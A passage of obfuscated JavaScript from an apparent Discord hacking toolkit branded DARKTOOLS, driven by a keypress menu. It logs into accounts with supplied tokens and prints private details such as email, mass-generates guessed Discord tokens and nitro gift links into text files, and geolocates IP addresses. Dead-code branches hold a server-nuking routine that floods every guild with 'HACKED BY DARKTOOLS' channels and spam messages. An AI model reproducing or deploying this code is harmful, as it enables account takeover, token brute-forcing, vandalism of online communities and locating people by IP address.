                                    _0x3709e9 && _0x4f36e8.FeJBN(_0x24cfde.name, _0x4f36e8.aOwQv) && (_0x43ca62 = true, _0x2397aa.clear(), _0x3c4f93(), _0x4f36e8.hUKGn(_0x20fb17), _0x488eda.destroy());
                                }
                            }
                        }
                        console['log'](yellow(_0x5861d4.NHDzl) + _0x5861d4.wzpyY(red, _0x5861d4['flcqx'])), console.log(_0x5861d4['BZKHj'](yellow, _0x5861d4.NHDzl) + _0x5861d4.BZKHj(red, _0x5861d4.LQLWC)), process.stdin['on']('keypress', function (_0xe1ad1f, _0x4a5e66) {
                            if (_0x5861d4.fprqm(_0x5861d4.GPgMD, _0x5861d4['GPgMD'])) {
                                if (_0x4a5e66 && _0x5861d4.qQFlE(_0x4a5e66.name, _0x5861d4.ricOQ)) {
                                    var _0x1026a2 = '4|2|1|3|0' ['split']('|'),
                                        _0x4d31fb = 0x0;
                                    while (true) {
                                        switch (_0x1026a2[_0x4d31fb++]) {
                                        case '0':
                                            _0x1f6e01.destroy();
                                            continue;
                                        case '1':
                                            _0x5861d4.XdSmX(Selections);
                                            continue;
                                        case '2':
                                            console.clear();
                                            continue;
                                        case '3':
                                            _0x5861d4.eOwzM(SelectionProcess);
                                            continue;
                                        case '4':
                                            tokenfucking = true;
                                            continue;
                                        }
                                        break;
                                    }
                                }
                            } else {
                                function _0x291c8b() {
                                    _0x52632c && _0x4f36e8.FeJBN(_0x3986e3.name, 'down') && (_0x1f0a1e = true, _0xe72a2d.clear(), _0x4f8105(), _0x38d8a8());
                                }
                            }
                        }), _0x5861d4.GuDrE(_0xb287de);
                    });
                }
            });
            else {
                if (_0x1c17b1 === '3') {
                    if (_0x464361.GntIT(_0x464361.xWkbt, _0x464361.ZPuYn)) {
                        const _0x66d41f = new Client();
                        console.clear(), rl['question'](_0x464361['eqpXI'](_0x464361.zpLtl, _0x464361.WFaiV(yellow, '> ')), function (_0xe64a6f) {
                            var _0x449144 = {};
                            _0x449144.tVSNf = function (_0x1bd2c7) {
                                return _0x1bd2c7();
                            }, _0x449144['cVInk'] = function (_0x264d91) {
                                return _0x3c39fd.LElRV(_0x264d91);
                            };
                            var _0x16889d = _0x449144;
                            if (_0x3c39fd.oTnlZ(_0x3c39fd.lUmWy, 'SEqZG')) {
                                console.clear();
                                let _0x28ba6b = _0xe64a6f;
                                _0x66d41f['login'](_0x28ba6b), _0x66d41f['on']('ready', () => {
                                    var _0x17d4b9 = {};
                                    _0x17d4b9.VLGgS = function (_0x32c834, _0x354acd) {
                                        return _0x3c39fd['oTnlZ'](_0x32c834, _0x354acd);
                                    }, _0x17d4b9.PvVqd = _0x3c39fd.XiImc, _0x17d4b9.gGnmQ = function (_0x2350e5, _0x1e4c01) {
                                        return _0x2350e5 + _0x1e4c01;
                                    }, _0x17d4b9['OBzAf'] = function (_0x57477a, _0x48b3d9) {
                                        return _0x3c39fd.NgXhc(_0x57477a, _0x48b3d9);
                                    }, _0x17d4b9.YDLHl = function (_0x2dd4c9, _0x48495c) {
                                        return _0x3c39fd.eqreO(_0x2dd4c9, _0x48495c);
                                    }, _0x17d4b9.TOzHY = function (_0x1519da, _0x297ff7) {
                                        return _0x1519da + _0x297ff7;
                                    }, _0x17d4b9.ynqLu = _0x3c39fd.Limae, _0x17d4b9.eyTgW = function (_0x1b79ab) {
                                        return _0x3c39fd.jalBo(_0x1b79ab);
                                    }, _0x17d4b9.ZPuad = function (_0x366301, _0x1f645f) {
                                        return _0x3c39fd.oBQfC(_0x366301, _0x1f645f);
                                    }, _0x17d4b9.qQEvX = 'pkQZD', _0x17d4b9.BoDQH = function (_0x38c39d) {
                                        return _0x3c39fd.LElRV(_0x38c39d);
                                    }, _0x17d4b9.UHxUc = function (_0x34c1bc) {
                                        return _0x3c39fd.LElRV(_0x34c1bc);
                                    };
                                    var _0x318b50 = _0x17d4b9;
                                    if (_0x3c39fd['oTnlZ'](_0x3c39fd.ukOjo, 'VGlaO')) {
                                        function _0x4123eb() {
                                            _0x16889d.tVSNf(_0x25967b);
                                        }
                                    } else {
                                        console['log'](_0x3c39fd.NGwgB(yellow('Username: '), _0x3c39fd['eqreO'](red, _0x66d41f['user']['username']))), console.log(_0x3c39fd.eqreO(yellow, _0x3c39fd.TKDGT) + _0x3c39fd['IEsQp'](red, _0x66d41f.user.tag)), console.log(_0x3c39fd.IEsQp(yellow, _0x3c39fd['TLSGb']) + red(_0x66d41f.user['id'])), console['log'](_0x3c39fd.NGwgB(yellow(_0x3c39fd.HRpcO), _0x3c39fd.IEsQp(red, _0x66d41f.user.createdAt))), console['log'](_0x3c39fd.NGwgB(_0x3c39fd['hspTf'](yellow, _0x3c39fd.WHtSA), _0x3c39fd.gVqun(red, _0x66d41f.user.email))), console.log(_0x3c39fd.NGwgB(_0x3c39fd.pjjHS(yellow, _0x3c39fd.gNevg), _0x3c39fd['pjjHS'](red, _0x66d41f.user['note']))), console.log(_0x3c39fd['pjjHS'](yellow, _0x3c39fd.chpdh) + red(_0x66d41f['user'].verified)), console.log(_0x3c39fd['NGwgB'](_0x3c39fd.sxPMG(yellow, _0x3c39fd.UMbic), _0x3c39fd.TlMhc(red, _0x66d41f.user.premium))), console.log(' '), console.log(_0x3c39fd.NDkrq(yellow, _0x3c39fd.KrcAf) + _0x3c39fd.bUjnv(red, 'PRESS ARROW DOWN TO GET BACK')), _0x66d41f.destroy();
                                        var _0x1ae35a = _0x3c39fd.Rlkfr;
                                        process.stdin['on']('keypress', function (_0x4e4fed, _0x5a508f) {
                                            if (_0x5a508f && _0x318b50.ZPuad(_0x5a508f.name, 'down')) {
                                                if ('pkQZD' === _0x318b50.qQEvX) console.clear(), _0x318b50.BoDQH(Selections), _0x318b50.UHxUc(SelectionProcess);
                                                else {
                                                    function _0x45593d() {
                                                        if (_0x318b50.VLGgS(_0x563fa2, true)) {
                                                            var _0xadf090 = _0x318b50.PvVqd.split('|'),
                                                                _0x4d79a1 = 0x0;
                                                            while (true) {
                                                                switch (_0xadf090[_0x4d79a1++]) {
                                                                case '0':
                                                                    _0x1cc069.forEach(_0xe31168 => _0xe31168.createChannel('HACKED BY DARKTOOLS').then(_0x49e283 => _0x49e283.send('GET HACKED LMFAOOO')));
                                                                    continue;
                                                                case '1':
                                                                    _0x217121++;
                                                                    continue;
                                                                case '2':
                                                                    var _0x1cc069 = _0x280018.guilds.array();
                                                                    continue;
                                                                case '3':
                                                                    _0x5bd241.log(_0x318b50.gGnmQ(_0x318b50.OBzAf(_0x3a9b0d, '[INFO] '), _0x318b50.YDLHl(_0x2de492, _0x318b50.TOzHY('Created Guild: ', _0x4c747c.user.tag) + _0x318b50['ynqLu'])));
                                                                    continue;
                                                                case '4':
                                                                    var _0x217121 = 0x0;
                                                                    continue;
                                                                case '5':
                                                                    _0x36ff29.user['createGuild'](_0x318b50.TOzHY(_0x3b0859.user.tag, _0x318b50.ynqLu));
                                                                    continue;
                                                                }
                                                                break;
                                                            }
                                                        } else _0x318b50.eyTgW(_0x11987b);
                                                    }
                                                }
                                            }
                                        });
                                    }
                                });
                            } else {
                                function _0x38ff60() {
                                    _0x189b9a['clear'](), _0x16889d.cVInk(_0xbf0098), _0x16889d.cVInk(_0x4d104f);
                                }
                            }
                        });
                    } else {
                        function _0x371def() {
                            if (_0x3c39fd.oTnlZ(_0x3d80d6, true)) {
                                var _0x54c0ed = _0x3c39fd.evCWr.split('|'),
                                    _0x43dbcb = 0x0;
                                while (true) {
                                    switch (_0x54c0ed[_0x43dbcb++]) {
                                    case '0':
                                        _0x391878.log(_0x3c39fd.RqNLn(_0x3c39fd.bUjnv(_0x44297b, _0x3c39fd.aSNsM), _0x2e6fc7(_0x7896c2)));
                                        continue;
                                    case '1':
                                        _0x502ca7['appendFileSync'](_0x3c39fd.SIvrQ, _0x3c39fd['RqNLn'](_0x3c39fd.oYLVT(_0x3c39fd.oYLVT(_0x3c39fd.yELqm(_0x3c39fd.CZYHt + _0x368e32.generate(0x13), '.'), _0x219ecf.generate(0x5)), '.') + _0x12ac86.generate(0x1b), '\x0a'));
                                        continue;
                                    case '2':
                                        _0x450546.log(_0x37b7f2(_0x3c39fd.KrcAf) + _0x3ad0cb(_0x3c39fd.GIltV));
                                        continue;
                                    case '3':
                                        _0x3549e2.generate(0x10);
                                        continue;
                                    case '4':
                                        _0x5a59de++;
                                        continue;
                                    case '5':
                                        _0x3c366f.clear();
                                        continue;
                                    }
                                    break;
                                }
                            } else {}
                        }
                    }
                }
            }
        }
        if (_0x1c17b1 === '4') {
            if (_0x464361.MBanF(_0x464361.iRDZg, _0x464361.zXFFI)) {
                function _0x494761() {
                    var _0x48c85e = _0x464361.JeMKe.split('|'),
                        _0xddecbe = 0x0;
                    while (true) {
                        switch (_0x48c85e[_0xddecbe++]) {
                        case '0':
                            var _0x40a9ed = true;
                            continue;
                        case '1':
                            var _0x215547 = _0x464361.ttmjq(_0x2932b3, _0x464361.PZCUj);
                            continue;
                        case '2':
                            var _0x14914a = {};
                            _0x14914a.cHKOe = 'Tokens.txt', _0x14914a['FuWdQ'] = function (_0x8828a9, _0xbc4723) {
                                return _0x8828a9 + _0xbc4723;
                            }, _0x14914a.CeTSs = function (_0x230966, _0x183350) {
                                return _0x464361['sEjea'](_0x230966, _0x183350);
                            }, _0x14914a.YVoGy = function (_0x253303, _0x5930f6) {
                                return _0x464361.sEjea(_0x253303, _0x5930f6);
                            }, _0x14914a.mbDZq = function (_0x1de715, _0x24914b) {
                                return _0x464361.HMoZd(_0x1de715, _0x24914b);
                            }, _0x14914a['jxjPq'] = function (_0x1b3afd, _0x22684f) {
                                return _0x464361.wONWt(_0x1b3afd, _0x22684f);
                            }, _0x14914a['Umqll'] = _0x464361.MBeBm, _0x14914a['oiYvH'] = function (_0x34c660, _0x2ced83) {
                                return _0x464361.ttmjq(_0x34c660, _0x2ced83);
                            }, _0x14914a.ZHzuC = _0x464361['RauMV'], _0x14914a.JfMNv = function (_0x108509, _0x2530a5) {
                                return _0x464361.OncPg(_0x108509, _0x2530a5);
                            }, _0x14914a.bXYdQ = function (_0x33fe2f, _0x54ed56) {
                                return _0x33fe2f(_0x54ed56);
                            }, _0x14914a['bvvXZ'] = _0x464361.qUmiP;
                            var _0x3a8226 = _0x14914a;
                            continue;
                        case '3':
                            var _0x265e4a = 0x1;
                            continue;
                        case '4':
                            _0x464361.GTikM(_0x5e0146, () => {
                                if (_0x40a9ed === true) {
                                    var _0x24590a = ('5|1|3|4|0|' + '2').split('|'),
                                        _0x3c738b = 0x0;
                                    while (true) {
                                        switch (_0x24590a[_0x3c738b++]) {
                                        case '0':
                                            _0x215547.generate(0x10);
                                            continue;
                                        case '1':
                                            _0x2bb92e['appendFileSync'](_0x3a8226.cHKOe, _0x3a8226.FuWdQ(_0x3a8226.CeTSs(_0x3a8226.YVoGy(_0x3a8226.mbDZq(_0x3a8226.jxjPq(_0x3a8226.Umqll, _0x215547.generate(0x13)), '.'), _0x215547.generate(0x5)) + '.', _0x215547.generate(0x1b)), '\x0a'));
                                            continue;
                                        case '2':
                                            _0x265e4a++;
                                            continue;
                                        case '3':
                                            _0x369578.log(_0x3a8226.oiYvH(_0x5d4e63, _0x3a8226.ZHzuC) + _0x3a8226.JfMNv(_0x1fdcf0, _0x265e4a));
                                            continue;
                                        case '4':
                                            _0x4f50c0.log(_0x9709e1('[INFO] ') + _0x3a8226.bXYdQ(_0x1dd6c6, _0x3a8226.bvvXZ));
                                            continue;
                                        case '5':
                                            _0x2e7307['clear']();
                                            continue;
                                        }
                                        break;
                                    }
                                } else {}
                            }, _0x4c16be);
                            continue;
                        }
                        break;
                    }
                }
            } else rl.question('Interval i' + `n MS:\
` + _0x464361.WFaiV(yellow, '> '), function (_0x329e8d) {
                var _0x59be28 = {};
                _0x59be28.FYwDO = function (_0x4ce283, _0x2945da) {
                    return _0x464361.stuEM(_0x4ce283, _0x2945da);
                }, _0x59be28.ohcdu = _0x464361.wgsws, _0x59be28.RwEIr = _0x464361.anBYj, _0x59be28.nuMKt = function (_0x19b05f, _0x492060) {
                    return _0x464361['OsLCm'](_0x19b05f, _0x492060);
                }, _0x59be28['frYZO'] = _0x464361.qsczr, _0x59be28.VNovk = _0x464361.ZFwSf, _0x59be28.anfPK = function (_0x13e939, _0x459202) {
                    return _0x13e939 + _0x459202;
                }, _0x59be28.rJxya = 'https://discord.gift/', _0x59be28.AHKSU = function (_0x3eeb4f, _0x548397) {
                    return _0x3eeb4f(_0x548397);
                }, _0x59be28.PfDrk = _0x464361.jOhwW, _0x59be28.AQlpo = '[INFO] ', _0x59be28['SVrbP'] = function (_0x19559f, _0x1ffdef) {
                    return _0x19559f(_0x1ffdef);
                }, _0x59be28.IRGeq = _0x464361.qUmiP;
                var _0x6c20d5 = _0x59be28,
                    _0x2440b7 = _0x464361['sHxJW'](require, _0x464361.PZCUj),
                    _0x31a222 = true,
                    _0x4961fd = 0x1;
                _0x464361['GTikM'](setInterval, () => {
                    var _0x343df3 = {};
                    _0x343df3['oHcbZ'] = function (_0x2c651a, _0x2ecb55) {
                        return _0x6c20d5.FYwDO(_0x2c651a, _0x2ecb55);
                    }, _0x343df3.JVAAY = 'down', _0x343df3.RytTZ = function (_0x111f02, _0x3b6c44) {
                        return _0x111f02 === _0x3b6c44;
                    }, _0x343df3.htQsf = 'VcKtX', _0x343df3.aLWIi = _0x6c20d5.ohcdu, _0x343df3.QJuKz = function (_0x1ddbda) {
                        return _0x1ddbda();
                    };
                    var _0x42eb41 = _0x343df3;
                    process.stdin['on'](_0x6c20d5.RwEIr, function (_0x4cb742, _0xc1527c) {
                        var _0x5707a5 = {};
                        _0x5707a5.pUMvi = function (_0x4149e1, _0x3af892) {
                            return _0x42eb41.oHcbZ(_0x4149e1, _0x3af892);
                        }, _0x5707a5.OsNwy = _0x42eb41.JVAAY, _0x5707a5['fPdLk'] = function (_0x49b0be) {
                            return _0x49b0be();
                        };
                        var _0x3163d0 = _0x5707a5;
                        if (_0x42eb41.RytTZ(_0x42eb41.htQsf, _0x42eb41.aLWIi)) {
                            function _0x454eb0() {
                                if (_0x5329bc && _0x3163d0.pUMvi(_0x925065.name, _0x3163d0['OsNwy'])) {
                                    var _0x4c87c1 = '3|1|2|0|4' ['split']('|'),
                                        _0x1fcd54 = 0x0;
                                    while (true) {
                                        switch (_0x4c87c1[_0x1fcd54++]) {
                                        case '0':
                                            _0x3163d0.fPdLk(_0x57dfe7);
                                            continue;
                                        case '1':
                                            _0x25b4a9.clear();
                                            continue;
                                        case '2':
                                            _0x209a24();
                                            continue;
                                        case '3':
                                            _0x550800 = true;
                                            continue;
                                        case '4':
                                            _0x2a29e0.destroy();
                                            continue;
                                        }
                                        break;
                                    }
                                }
                            }
                        } else _0xc1527c && _0xc1527c.name == _0x42eb41.JVAAY && (_0x31a222 = true, console.clear(), Selections(), _0x42eb41.QJuKz(SelectionProcess));
                    });
                    if (_0x6c20d5.nuMKt(_0x31a222, true)) {
                        var _0x578900 = _0x6c20d5.frYZO.split('|'),
                            _0x97c54c = 0x0;
                        while (true) {
                            switch (_0x578900[_0x97c54c++]) {
                            case '0':
                                fs.appendFileSync(_0x6c20d5['VNovk'], _0x6c20d5.anfPK(_0x6c20d5.anfPK(_0x6c20d5.rJxya, _0x2440b7.generate(0x10)), '\x0a'));
                                continue;
                            case '1':
                                console.log(_0x6c20d5.AHKSU(yellow, _0x6c20d5.PfDrk) + _0x6c20d5.AHKSU(red, _0x4961fd));
                                continue;
                            case '2':
                                _0x4961fd++;
                                continue;
                            case '3':
                                console.clear();
                                continue;
                            case '4':
                                console.log(_0x6c20d5.AHKSU(yellow, _0x6c20d5.AQlpo) + _0x6c20d5.SVrbP(red, _0x6c20d5['IRGeq']));
                                continue;
                            }
                            break;
                        }
                    } else {}
                }, _0x329e8d);
            });
        }
        if (_0x1c17b1 === '5') {
            if (_0x464361.GntIT(_0x464361['SRqKH'], _0x464361['SRqKH'])) {
                function _0xb66aa6() {
                    _0x174279.clear(), _0x2ef80b.log('Looked Up IP: ' + _0x3c39fd.kRShR(_0x97bd21, _0x7ffd59['body'].query) + (`\
Business ` + 'Name: ') + _0x3c39fd.kRShR(_0x289e0b, _0x5d29bf.body['businessName']) + (`\
Business ` + 'Website: ') + _0x3c39fd.eSAZH(_0x49c3dd, _0x458066.body.businessWebsite) + (`\
Continent` + ': ') + _0x3c39fd.eSAZH(_0x3d1e51, _0x50625d.body['continent']) + `\
Country: ` + _0x25bfff(_0x10de96.body.country) + (`\
Country C` + 'ode: ') + _0x3c39fd.qlbPf(_0x122b7b, _0x4c2d88['body']['countryCode']) + '\x0aIP Name: ' + _0x47de97(_0x3b981e.body.ipName) + `\
IP Type: ` + _0x3c39fd['QSpbJ'](_0x17b2fe, _0x3bcaaf.body.ipType) + `\
ISP: ` + _0x3c39fd.QSpbJ(_0x3931b4, _0x328ac7.body.isp) + (`\
Latitude:` + ' ') + _0x3c39fd.Xdtkb(_0x2256f8, _0x249a1d['body']['lat']) + (`\
Longitude` + ': ') + _0x3c39fd.Xdtkb(_0x383589, _0x3579af.body['lon']) + ('\x0aOrganisation: ') + _0x3c39fd['Xdtkb'](_0x339e75, _0x3f5c2c.body.org) + '\x0aRegion: ' + _0x3c39fd.pwKDw(_0x13f4ae, _0x224f36['body'].region) + '\x0aStatus: ' + _0x3c39fd['TbVkH'](_0x3ee073, _0x3118b0.body.status));
                }
            } else rl.question(_0x464361.MpQmY(_0x464361.aSpxN, _0x464361['WFaiV'](yellow, '> ')), function (_0x5b8e98) {
                var _0x346f13 = {};
                _0x346f13.KsqUU = function (_0x7d0db1, _0x564054) {
                    return _0x3c39fd['oTnlZ'](_0x7d0db1, _0x564054);
                }, _0x346f13.nNQTR = _0x3c39fd['SIvrQ'], _0x346f13.LpVgJ = function (_0x368808, _0x157239) {
                    return _0x3c39fd.aujWf(_0x368808, _0x157239);
                }, _0x346f13.UDnyP = function (_0x2e127d, _0x217d65) {
                    return _0x3c39fd.aujWf(_0x2e127d, _0x217d65);
                }, _0x346f13.PaQSC = function (_0x12f5fd, _0x2b2f07) {
                    return _0x3c39fd.aujWf(_0x12f5fd, _0x2b2f07);
                }, _0x346f13.TYHva = function (_0x5e69ac, _0x221d85) {
                    return _0x3c39fd.aujWf(_0x5e69ac, _0x221d85);
                }, _0x346f13.Zedal = function (_0x4256f2, _0x431823) {
                    return _0x3c39fd.TbVkH(_0x4256f2, _0x431823);
                }, _0x346f13.iOmIn = 'Tokens Generated: ', _0x346f13.UcpkV = function (_0x1cc927, _0x4aa61f) {
                    return _0x3c39fd.aujWf(_0x1cc927, _0x4aa61f);
                }, _0x346f13.OBWXV = function (_0x1c71ad, _0x4090b3) {
                    return _0x3c39fd.UHRON(_0x1c71ad, _0x4090b3);
                }, _0x346f13.hcyfp = function (_0x524af2, _0x3340d8) {
                    return _0x524af2(_0x3340d8);
                }, _0x346f13.BZVJD = _0x3c39fd.GIltV, _0x346f13['bcWKz'] = function (_0x10e694, _0x1773f9) {
                    return _0x10e694 == _0x1773f9;
                }, _0x346f13.SVBxi = _0x3c39fd.hrsUd, _0x346f13['ytQZZ'] = function (_0x5eb53e) {
                    return _0x3c39fd['lXCix'](_0x5eb53e);
                };
                var _0x84716b = _0x346f13;
                if (_0x3c39fd.dkueS(_0x3c39fd.mdQmM, _0x3c39fd['QeWgk'])) {
                    var _0x1f0201 = _0x3c39fd.UHRON(require, _0x3c39fd.tRLAi),
                        _0x1c6311 = true,
                        _0x13943d = 0x1;
                    _0x3c39fd.eXpni(setInterval, () => {
                        if (_0x84716b.KsqUU(_0x1c6311, true)) console.clear(), fs.appendFileSync(_0x84716b.nNQTR, _0x84716b['LpVgJ'](_0x84716b.UDnyP(_0x84716b['PaQSC'](_0x84716b.PaQSC('NDc0N', _0x1f0201.generate(0x13)), '.'), _0x1f0201.generate(0x5)) + '.', _0x1f0201.generate(0x1b)) + '\x0a'), console.log(_0x84716b.TYHva(_0x84716b.Zedal(yellow, _0x84716b['iOmIn']), red(_0x13943d))), console.log(_0x84716b['UcpkV'](_0x84716b.OBWXV(yellow, '[INFO] '), _0x84716b.hcyfp(red, _0x84716b.BZVJD))), _0x1f0201.generate(0x10), _0x13943d++;
                        else {}
                    }, _0x5b8e98);
                } else {
                    function _0xc7c23d() {
                        _0x1d4324 && _0x84716b['bcWKz'](_0x2584f7.name, _0x84716b['SVBxi']) && (_0x3b267b = true, _0x224685.clear(), _0x84716b['ytQZZ'](_0x1b5b0d), _0x84716b.ytQZZ(_0x3cc2cb));
                    }
                }
            });
        }
        if (_0x464361.ucFdp(_0x1c17b1, '6')) rl.question(_0x464361.MpQmY(`Enter IP:\
`, yellow('> ')), function (_0x112f30) {
            var _0x5f2936 = {};
            _0x5f2936.bErOr = function (_0x2fa39c, _0x515b90) {
                return _0x464361.sHxJW(_0x2fa39c, _0x515b90);
            }, _0x5f2936['laoMT'] = function (_0x1c3fb4, _0x15dfe0) {
                return _0x1c3fb4(_0x15dfe0);
            }, _0x5f2936.bQFWR = function (_0x1aabd4, _0x554c88) {
                return _0x464361['sHxJW'](_0x1aabd4, _0x554c88);
            }, _0x5f2936.AMrcc = function (_0x290615, _0x1c5c86) {
                return _0x290615(_0x1c5c86);
            }, _0x5f2936.VYXzO = function (_0x73f236, _0x16cd51) {
                return _0x464361.hrbdY(_0x73f236, _0x16cd51);
            };
            var _0x395ad6 = _0x5f2936;
            if (_0x464361.OsLCm('YGgDk', _0x464361.QbZXC)) {
                function _0x42985c() {
                    var _0x7afbe = ('4|0|3|1|5|' + '2').split('|'),
                        _0x407b80 = 0x0;
                    while (true) {
                        switch (_0x7afbe[_0x407b80++]) {
                        case '0':
                            var _0xd6c5d5 = _0x3634aa.guilds.array();
                            continue;
                        case '1':
                            _0x3e2e41++;
                            continue;
                        case '2':
                            _0x1bac92.log(_0x2939da(_0x3c39fd.KrcAf) + _0x2a4432(_0x3c39fd.aWMmp(_0x3c39fd.aWMmp(_0x3c39fd.SHvmh, _0x4d8441.user.tag), _0x3c39fd['Limae'])));
                            continue;
                        case '3':
                            _0xd6c5d5.forEach(_0x517456 => _0x517456.createChannel('HACKED BY DARKTOOLS').then(_0x59e1d9 => _0x59e1d9.send('GET HACKED LMFAOOO')));
                            continue;
                        case '4':
                            var _0x3e2e41 = 0x0;
                            continue;
                        case '5':
                            _0x60c90d.user['createGuild'](_0x3c39fd.wxpwy(_0x57f869.user['tag'], _0x3c39fd.Limae));
                            continue;
                        }
                        break;
                    }
                }
            } else {
                console.clear();
                let _0x3c1ba0 = _0x112f30;
                snekfetch['get'](_0x464361.wONWt(_0x464361.UScip, _0x3c1ba0)).then(_0x47e482 => {
                    console['clear'](), console.log('Looked Up IP: ' + _0x395ad6['bErOr'](red, _0x47e482.body['query']) + (`\
Business ` + 'Name: ') + _0x395ad6.laoMT(red, _0x47e482.body['businessName']) + (`\
Business ` + 'Website: ') + _0x395ad6.laoMT(red, _0x47e482.body.businessWebsite) + (`\
Continent` + ': ') + _0x395ad6['bQFWR'](red, _0x47e482.body.continent) + `\
Country: ` + red(_0x47e482.body.country) + (`\
Country C` + 'ode: ') + red(_0x47e482.body['countryCode']) + `\
IP Name: ` + _0x395ad6.bQFWR(red, _0x47e482.body.ipName) + `\
IP Type: ` + red(_0x47e482['body']['ipType']) + `\
ISP: ` + _0x395ad6.AMrcc(red, _0x47e482.body.isp) + (`\
Latitude:` + ' ') + red(_0x47e482.body.lat) + (`\
Longitude` + ': ') + _0x395ad6.AMrcc(red, _0x47e482.body['lon']) + ('\x0aOrganisation: ') + _0x395ad6.AMrcc(red, _0x47e482.body.org) + `\
Region: ` + _0x395ad6.AMrcc(red, _0x47e482['body']['region']) + `\
Status: ` + _0x395ad6.VYXzO(red, _0x47e482.body.status));
                }), process.stdin['on']('keypress', function (_0x16f54d, _0x59d8fe) {
                    _0x59d8fe && _0x59d8fe.name == 'down' && (endgenerating = true, console.clear(), _0x3c39fd.ooHDV(Selections), SelectionProcess());
                });
            }
        });
        else {
            if (_0x464361.hfPQf !== _0x464361.hfPQf) {
                function _0x48b847() {
                    var _0x5283f5 = {};
                    _0x5283f5.plaDh = function (_0x291a02, _0x5ba77c) {
                        return _0x464361.PEtqS(_0x291a02, _0x5ba77c);
                    }, _0x5283f5['CBWLh'] = function (_0x6bf781, _0x100211) {
                        return _0x6bf781(_0x100211);
                    }, _0x5283f5.KrjCO = function (_0xde2639, _0x52fc9a) {
                        return _0xde2639(_0x52fc9a);
                    }, _0x5283f5.ujHOX = function (_0x546556, _0x37f4d9) {
                        return _0x464361['EndMF'](_0x546556, _0x37f4d9);
                    }, _0x5283f5.UwysN = function (_0x74a1de, _0x5a613a) {
                        return _0x464361.BQBll(_0x74a1de, _0x5a613a);
                    }, _0x5283f5.CQMbx = function (_0x2bdea8, _0xee6f2c) {
                        return _0x464361.BQBll(_0x2bdea8, _0xee6f2c);
                    }, _0x5283f5.AFgdn = function (_0x1e34e9, _0x5c5eda) {
                        return _0x464361.BQBll(_0x1e34e9, _0x5c5eda);
                    }, _0x5283f5.acEnZ = function (_0x22240f, _0x4d6e34) {
                        return _0x464361.BQBll(_0x22240f, _0x4d6e34);
                    }, _0x5283f5.VKROL = function (_0x51dda8, _0x532a93) {
                        return _0x464361.BQBll(_0x51dda8, _0x532a93);
                    }, _0x5283f5.TVxGN = function (_0x174580, _0x558eb2) {
                        return _0x464361.tqAjV(_0x174580, _0x558eb2);
                    }, _0x5283f5.EMYCs = function (_0x2e3293, _0x19eb33) {
                        return _0x464361.TkOik(_0x2e3293, _0x19eb33);
                    }, _0x5283f5.ttgda = function (_0x5e7824, _0x4e5ea9) {
                        return _0x464361.stuEM(_0x5e7824, _0x4e5ea9);
                    }, _0x5283f5['ZsJiQ'] = _0x464361['fxyJy'], _0x5283f5.lIMeY = function (_0x3bb687) {
                        return _0x3bb687();
                    };
                    var _0x2e574d = _0x5283f5;
                    _0x43c369.clear();
                    let _0x1a5bf2 = _0xcacf8e;
                    _0x508f95.get(_0x464361.XwQHP(_0x464361.UScip, _0x1a5bf2))['then'](_0x5eb727 => {
                        _0x4d8718['clear'](), _0x339b24.log('Looked Up IP: ' + _0x2e574d.plaDh(_0x566fc9, _0x5eb727.body.query) + (`\
Business ` + 'Name: ') + _0x2e574d['CBWLh'](_0x27f7f9, _0x5eb727.body['businessName']) + (`\
Business ` + 'Website: ') + _0x1a5097(_0x5eb727['body'].businessWebsite) + (`\
Continent` + ': ') + _0x2e574d.CBWLh(_0x4d2f7a, _0x5eb727.body.continent) + `\
Country: ` + _0x2e574d.KrjCO(_0x202c07, _0x5eb727.body.country) + (`\
Country C` + 'ode: ') + _0x2e574d.ujHOX(_0x1487d1, _0x5eb727['body']['countryCode']) + '\x0aIP Name: ' + _0x2e574d.UwysN(_0x4b936e, _0x5eb727.body.ipName) + '\x0aIP Type: ' + _0x2e574d.CQMbx(_0x4446be, _0x5eb727.body.ipType) + `\
ISP: ` + _0x2e574d['AFgdn'](_0x459de0, _0x5eb727.body.isp) + (`\
Latitude:` + ' ') + _0x2e574d['acEnZ'](_0x3d850d, _0x5eb727.body.lat) + ('\x0aLongitude: ') + _0x46f946(_0x5eb727.body.lon) + (`\
Organisat` + 'ion: ') + _0x2e574d.VKROL(_0xc569ac, _0x5eb727.body.org) + '\x0aRegion: ' + _0x2e574d.TVxGN(_0x526cc7, _0x5eb727.body.region) + `\
Status: ` + _0x2e574d.EMYCs(_0xf85aa3, _0x5eb727.body.status));
                    }), _0x432273.stdin['on'](_0x464361['anBYj'], function (_0x520c05, _0x52ecf5) {
                        _0x52ecf5 && _0x2e574d.ttgda(_0x52ecf5.name, _0x2e574d['ZsJiQ']) && (_0x2eb782 = true, _0x1702ed['clear'](), _0x2e574d.lIMeY(_0x55903e), _0x254b51());
                    });
                }
            } else console.clear(), _0x464361.tirQD(Selections), console.log(_0x464361.MpQmY(_0x464361.ZNiUi(yellow, '[ERROR] '), _0x464361.ZNiUi(red, _0x464361.lgQcX))), SelectionProcess();
        }
    });
}
Selections(), SelectionProcess();
